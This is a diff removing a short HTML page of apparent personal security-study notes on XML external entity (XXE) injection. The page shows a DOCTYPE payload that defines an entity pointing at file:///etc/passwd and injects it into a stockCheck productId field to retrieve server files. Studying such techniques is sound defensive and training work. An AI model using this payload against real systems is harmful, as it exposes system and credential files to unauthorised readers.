@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>Retrieve Files</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>Retrieve Files</h1><br/>• Modify the XML in 2 ways<br />   ◇ Introduce/edit a DOCTYPE element defining entity containg path to the file<br />   ◇ Edit data value in the XML that is returned in applications response to make use of that entity.<br />   ◇ &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM “file:///etc/passwd”&gt; ]&gt;<br />   ◇ &lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;<br />• Good to check all data values in submitted XML</div></body></html>
